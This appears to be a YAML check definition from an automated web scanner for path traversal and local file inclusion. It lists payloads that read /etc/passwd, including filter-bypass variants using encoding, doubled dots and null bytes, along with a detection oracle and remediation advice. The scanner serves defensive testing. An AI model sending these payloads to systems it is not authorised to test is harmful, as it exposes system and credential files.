id: path-traversal-lfi
name: Path Traversal / Local File Inclusion
family: lfi
severity: high
cwe: CWE-22
owasp: WSTG-ATHZ-01
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
inject_into: [query, body, json, path]
payloads:
  - "../../../../etc/passwd"
  - "../../../../../../etc/passwd"
  - "pyproject.toml"
# Tried only when the planner marks lfi a priority (e.g. a PHP stack). Traversal/encoding variants that
# defeat common path filters; each still resolves to /etc/passwd, so the SAME passwd-signature oracle
# (plus catch_all_guard) confirms it — more filters bypassed, no new false positives.
intensive_payloads:
  - "....//....//....//....//etc/passwd"            # collapses to ../ after a strip-once filter
  - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"         # URL-encoded separators
  - "..%252f..%252f..%252fetc%252fpasswd"           # double URL-encoded (decoded twice upstream)
  - "/etc/passwd"                                   # absolute path — no traversal filter to beat
  - "../../../../../../../../../../etc/passwd"       # very deep traversal (short base dir)
  - "../../../../etc/passwd%00"                      # legacy null-byte truncation (old PHP)
oracle:
  type: any_of
  checks:
    - type: response_match
      part: body
      patterns:
        - "root:.*:0:0:"
        - "\\[build-system\\]"
confirm_reproducible: true
catch_all_guard: true   # ignore endpoints that return the same page for any filename
remediation: >-
  Never build filesystem paths directly from user input. Resolve against a
  fixed base directory, canonicalize, and reject any path that escapes it —
  or better, use an indirect file-id -> path mapping instead of raw paths.
